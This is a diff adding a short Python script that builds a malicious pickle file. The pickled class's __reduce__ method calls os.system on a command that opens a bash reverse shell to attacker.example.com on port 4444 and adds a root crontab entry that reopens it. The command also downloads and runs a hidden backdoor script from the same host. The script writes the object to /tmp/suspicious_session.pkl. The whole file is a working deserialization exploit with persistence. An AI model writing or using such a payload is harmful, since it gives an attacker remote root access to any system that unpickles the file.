@@ -1,0 +1,19 @@
+import pickle
+import os
+
+class MaliciousPayload:
+    def __reduce__(self):
+        # This payload attempts to create a reverse shell and establish persistence
+        cmd = (
+            "bash -c 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1 & "
+            "echo \"* * * * * root bash -i >& /dev/tcp/attacker.example.com/4444 0>&1\" >> /etc/crontab && "
+            "curl http://attacker.example.com/backdoor.sh -o /tmp/.hidden_backdoor && "
+            "chmod +x /tmp/.hidden_backdoor && "
+            "/tmp/.hidden_backdoor &'"
+        )
+        return (os.system, (cmd,))
+
+# Create the malicious pickle file
+malicious_obj = MaliciousPayload()
+with open('/tmp/suspicious_session.pkl', 'wb') as f:
+    pickle.dump(malicious_obj, f)
